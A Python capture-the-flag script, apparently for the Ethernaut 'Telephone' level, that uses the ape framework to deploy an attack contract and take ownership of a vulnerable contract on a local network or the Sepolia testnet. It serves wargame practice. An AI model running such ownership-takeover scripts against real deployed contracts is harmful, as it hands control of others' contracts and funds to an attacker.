#!/usr/bin/python3
from ape import project, networks, accounts
from scripts.deploy import deploy
from scripts.helper_functions import get_account
from colorama import Fore

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


# sepolia: 0x8BDb7E8301Fa511903d01Dbabf2ac902c169f475
ADDRESS = "0xdEb90D24E9393D87Ee4D9A73FCbfDc1D2a9b4070"

def attack():
    if networks.active_provider.network.name == "local":
        target = deploy()
        _, attacker = get_account()
    elif networks.active_provider.network.name == "sepolia-fork":
        target = project.Telephone.at(ADDRESS)
        _, attacker = get_account()
    else:
        target = project.Telephone.at(ADDRESS)
        attacker = accounts.load("ctf")
        attacker.set_autosign(True)
        #attacker = get_account()
        #print(networks.active_provider.network.name)

    # deploy the attack contract
    #attack_contract = attacker.deploy(project.Telephone, target.address)
    attack_contract = project.Attack.deploy(target.address, sender=attacker)
    print(f"{green}Owner address: {magenta}{target.owner()}{reset}")
    print(f"{red}Attacking Now...{reset}")


    #attack_contract = project.Telephone.at("0x510C59e5B4fE2b8E374281203D8A8d668f33D406")
    attack_contract.changeOwner(attacker.address, sender=attacker)


    assert target.owner() == attacker.address
    
    print(f"{green}Attacker address: {red}{attacker.address}")
    print(f"{green}New Owner: {red}{target.owner()}{reset}")



def main():
    attack()

if __name__ == "__main__":
    main()